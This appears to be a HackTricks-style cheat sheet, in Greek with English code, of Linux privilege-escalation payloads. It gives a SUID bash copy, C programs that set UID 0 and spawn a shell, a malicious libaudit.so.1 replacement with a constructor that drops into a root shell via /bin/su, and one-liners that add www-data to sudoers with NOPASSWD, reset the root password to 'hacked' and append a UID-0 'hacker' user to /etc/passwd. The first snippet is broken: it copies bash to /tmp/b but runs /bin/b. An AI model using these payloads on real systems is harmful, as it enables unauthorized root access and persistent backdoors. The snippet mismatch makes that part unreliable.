# Payloads προς εκτέλεση

## Bash

Το `bash -p` ενεργοποιεί το privileged mode: όταν το Bash ξεκινά με διαφορετικά real και effective IDs, δεν επαναφέρει το effective ID στο real ID. Το shell που προκύπτει εξακολουθεί να εξαρτάται από τα υπάρχοντα credentials του caller.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

Το `setresuid` αλλάζει τα πραγματικά, effective και αποθηκευμένα IDs όταν επιτρέπεται, ενώ το `setuid` αλλάζει το effective ID και μπορεί επίσης να ορίσει τα πραγματικά και αποθηκευμένα IDs για έναν privileged caller. Το `execve` αντικαθιστά το image της τρέχουσας διεργασίας με το ζητούμενο πρόγραμμα.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Αυτά τα παραδείγματα παραλείπουν τους ελέγχους τιμών επιστροφής· και οι δύο κλήσεις credential μπορούν να αποτύχουν ακόμη και για UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Αντικατάσταση ενός αρχείου για κλιμάκωση προνομίων

### Συνήθη αρχεία

Αυτά είναι συνήθη τοπικά αρχεία και interfaces ελέγχου προνομίων: το `/etc/passwd` αποθηκεύει εγγραφές λογαριασμών επτά πεδίων, το `/etc/shadow` αποθηκεύει προαιρετικά κρυπτογραφημένα δεδομένα κωδικών πρόσβασης, το `sudoers` ορίζει προνόμια sudo και tags όπως `NOPASSWD`, και το προεπιλεγμένο endpoint του daemon του Docker είναι ένα Unix socket στο `/var/run/docker.sock`· η πρόσβαση σε αυτό το socket μπορεί να προσφέρει έλεγχο σε επίπεδο root του host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Προσθήκη χρήστη με κωδικό πρόσβασης στο _/etc/passwd_
- Αλλαγή κωδικού πρόσβασης μέσα στο _/etc/shadow_
- Προσθήκη χρήστη στο sudoers στο _/etc/sudoers_
- Abuse του Docker μέσω του docker socket, συνήθως στο _/run/docker.sock_ ή στο _/var/run/docker.sock_

### Αντικατάσταση μιας library

Ελέγξτε ποιες shared libraries χρησιμοποιεί ένα binary· σε αυτό το παράδειγμα, επιθεωρήστε το `/bin/su` με το `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
Το `ldd` αναφέρει τις dependencies των shared objects, ενώ ο dynamic linker χρησιμοποιεί τα ELF metadata και τους κανόνες αναζήτησής του για να τα φορτώσει κατά το runtime.<sup>[[9]](#references)[[10]](#references)</sup>

Για να ελέγξετε έναν υποψήφιο, χρησιμοποιήστε το `objdump -T` για να εμφανίσετε τον dynamic symbol table του `su` και να φιλτράρετε τα audit names.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Οι `audit_open`, `audit_log_user_message` και `audit_log_acct_message` είναι συναρτήσεις της libaudit· το `audit_fd` εμφανίζεται ως αντικείμενο δεδομένων που έχει οριστεί στο `.bss` του `su` σε αυτή την έξοδο.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Μια βιβλιοθήκη αντικατάστασης πρέπει να εξάγει συμβατούς ορισμούς για τα undefined symbols που επιλύει ο loader· οι ασυμφωνίες στα ABI συναρτήσεων/δεδομένων μπορούν και πάλι να προκαλέσουν αποτυχία της διεργασίας κατά την ανακατεύθυνση αυτών των symbols ή την κλήση τους.<sup>[[10]](#references)[[11]](#references)</sup>

Το attribute `constructor` του GCC προκαλεί την αυτόματη κλήση της `inject` πριν από τη `main` σε υποστηριζόμενους στόχους.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Εάν το replacement φορτωθεί επιτυχώς από μια privileged διαδικασία **`/bin/su`**, αυτός ο constructor μπορεί να εκκινήσει το **`/bin/bash`** με τα privileges της συγκεκριμένης διαδικασίας· το ακριβές αποτέλεσμα εξαρτάται από το περιβάλλον.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

Μπορείς να κάνεις το root να εκτελέσει κάτι;

Το `sudoers` χρησιμοποιεί το tag `NOPASSWD` στις καταχωρίσεις πολιτικής, το `chpasswd` διαβάζει ζεύγη `user:password` από την τυπική είσοδο και το `/etc/passwd` χρησιμοποιεί επτά πεδία λογαριασμού διαχωρισμένα με άνω-κάτω τελεία· τα ακόλουθα παραδείγματα προϋποθέτουν ότι τα σχετικά αρχεία είναι εγγράψιμα από τη διαδικασία που τα εκτελεί.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data σε sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Αλλαγή κωδικού πρόσβασης root**
```bash
echo "root:hacked" | chpasswd
```
### Προσθήκη νέου χρήστη root στο /etc/passwd

Το τελικό payload εξαρτάται από έναν target που αποδέχεται το παραγόμενο `crypt` hash: το `mkpasswd -m sha-512` του Debian αντιστοιχίζει στο SHA-512 crypt (`$6$`), ενώ το `passwd -1 -salt` του OpenSSL χρησιμοποιεί τον αλγόριθμο BSD που βασίζεται στο MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Η εντολή Set (Εγχειρίδιο αναφοράς Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Σελίδες man του Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Προστασία του socket του Docker daemon](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Τεκμηρίωση Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (Βοηθητικά προγράμματα δυαδικών αρχείων GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Σελίδες man του Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Σελίδες man του Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Σελίδες man του Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Κοινά attributes (Χρήση της συλλογής μεταγλωττιστών GNU)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Πηγαίος κώδικας Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Τεκμηρίωση OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
